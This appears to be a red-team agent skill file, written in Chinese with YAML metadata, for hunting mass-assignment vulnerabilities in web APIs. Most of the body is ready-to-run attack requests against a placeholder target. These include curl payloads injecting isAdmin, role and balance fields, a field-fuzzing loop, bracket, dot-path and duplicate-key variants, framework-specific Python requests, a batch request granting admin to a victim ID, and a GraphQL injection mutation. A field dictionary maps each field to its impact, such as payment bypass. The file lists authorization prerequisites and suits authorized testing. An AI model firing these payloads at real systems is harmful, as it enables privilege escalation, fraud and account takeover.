---
name: hunt-mass-assignment
description: 通过敏感字段注入与 ORM 框架利用来狩猎批量赋值漏洞。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, mass-assignment, API, ORM, authorization, field-injection]
  category: redteam
  related_skills:
    - hunt-api-misconfig
    - hunt-idor
    - hunt-write-gap
---

# 批量赋值狩猎

狩猎批量赋值（mass assignment）漏洞，即 API 端点在没有白名单限制的情况下，将用户提供的字段盲目绑定到内部对象。像 `isAdmin`、`role`、`ownerId`、`plan`、`tier`、`balance` 和 `verified` 这样的敏感字段可被注入，以提升权限、绕过支付或夺取资源所有权。

## When to Use

- API 接受包含 UI 未暴露字段的 JSON/XML/表单请求体。
- 用户资料更新、注册、结账或资源创建端点。
- 框架 ORM（Rails ActiveRecord、Laravel Eloquent、Django ORM、Mongoose、Prisma）中批量赋值是默认行为。
- 接受稀疏更新的 PATCH 端点——可能跳过逐字段授权。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获取明确确认。

## How to Run

```bash
# Inject sensitive fields into profile update
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","isAdmin":true,"role":"admin"}'
```

## 快速检测

```bash
# Inject sensitive fields into profile update
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","isAdmin":true,"role":"admin"}'
```

## 关键敏感字段字典

| 字段 | 影响 |
|---|---|
| `isAdmin`、`is_admin`、`admin` | 提升为管理员 |
| `role`、`roles`、`user_role` | 角色提升 |
| `ownerId`、`user_id`、`authorId` | 资源夺取 |
| `plan`、`tier`、`subscription_type` | 绕过支付 |
| `balance`、`credits`、`wallet` | 资金操纵 |
| `verified`、`is_verified`、`email_verified` | 绕过验证 |
| `discount`、`coupon_applied`、`promo` | 价格操纵 |
| `organizationId`、`tenantId`、`teamId` | 跨租户访问 |
| `banned`、`disabled`、`suspended` | 账户状态控制 |

## Procedure

### 阶段 1 —— 敏感字段注入

```bash
# Dictionary fuzzing on profile endpoint
FIELDS=("isAdmin:true" "role:admin" "is_admin:true" "roles:[\"admin\"]"
        "plan:enterprise" "tier:platinum" "balance:999999"
        "verified:true" "ownerId:1" "user_id:1" "authorId:1"
        "organizationId:1" "teamId:1" "tenantId:1"
        "can_manage:true" "permissions:{\"admin\":true}"
        "access_level:admin" "group:administrators"
        "is_superuser:true" "superuser:1" "staff:true")

for field in "${FIELDS[@]}"; do
  key="${field%%:*}"
  val="${field#*:}"
  curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
    -H "Content-Type: application/json" \
    -d "{\"$key\":$val,\"name\":\"test\"}" \
    -w "\n%{http_code} — $key\n" -o /dev/null
done
```

### 阶段 2 —— 结构变体与编码

```bash
# Dot-path notation (Mongoose, some ORMs)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"profile.is_admin":true}' \
  -H "Content-Type: application/json"

# Bracket notation (PHP frameworks)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/register" \
  -d 'user[name]=test&user[is_admin]=1' \
  -H "Content-Type: application/x-www-form-urlencoded"

# Array wrappers (Rails, Laravel)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"user":{"name":"test","admin":true}}' \
  -H "Content-Type: application/json"

# Duplicate keys (parser differential)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"name":"test","role":"user","role":"admin"}' \
  -H "Content-Type: application/json"
```

### 阶段 3 —— 框架特定模式

```python
# Django REST Framework — PATCH on nested serializers
requests.patch("https://target.com/api/profile/", json={
    "user": {"is_staff": True, "is_superuser": True}
})

# Laravel Eloquent — forceFill bypass
requests.post("https://target.com/api/users", json={
    "name": "test", "email": "test@test.com",
    "is_admin": 1, "role": "admin"
})

# Mongoose — $set on findByIdAndUpdate
requests.put("https://target.com/api/users/me", json={
    "$set": {"role": "admin", "verified": True}
})

# Prisma — connect/create nested relations
requests.post("https://target.com/api/organizations", json={
    "name": "test",
    "owner": {"connect": {"id": 1}}  # takeover existing owner
})
```

### 阶段 4 —— 批处理与 Patch 格式利用

```bash
# JSON Patch — add operation with sensitive field
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"add","path":"/role","value":"admin"}]'

# JSON Merge Patch — full object replacement
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"role":"admin","verified":true}'

# Batch endpoint — per-item auth skipped
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://target.com/api/users/batch" \
  -d '{"users":[{"id":"me","name":"test"},{"id":"VICTIM_ID","role":"admin"}]}'
```

### 阶段 5 —— GraphQL 输入类型注入

```graphql
mutation UpdateProfile {
  updateProfile(input: {
    name: "test"
    role: ADMIN       # injected field not in schema
    isAdmin: true     # injected field
  }) {
    id
    role
  }
}
```

## Pitfalls

- **某些框架会静默忽略未知字段。** 用不同命名约定（snake_case、camelCase、PascalCase）尝试同一字段。
- **PATCH 可能比 PUT 更宽松。** 两种方法都要测试——某些框架按 HTTP 方法应用不同的序列化器。
- **GraphQL 输入类型是自文档化的。** 使用 introspection 找出所有可写字段，然后测试 schema 之外的额外字段。
- **批处理端点常常跳过逐项授权。** 用混合数组测试，其中只有一项属于攻击者。

## Verification

1. 向攻击者不应控制的 PATCH/POST/PUT 端点注入敏感字段。
2. 通过 GET 读回，验证该字段已被持久化。
3. 确认该字段变更授予了更高访问权限（例如访问管理面板、查看其他用户）。
4. 用多种命名约定测试，以排除框架层面的字段拒绝。
5. 检查可能使用不同序列化器的批处理和 patch 格式端点。

---

## 相关技能

- **`hunt-api-misconfig`** —— 更广泛的 API 错误配置，包括批量赋值模式。
- **`hunt-idor`** —— 对象级授权缺口，常与批量赋值结合。
- **`hunt-write-gap`** —— 允许写入但无需读取认证的端点。
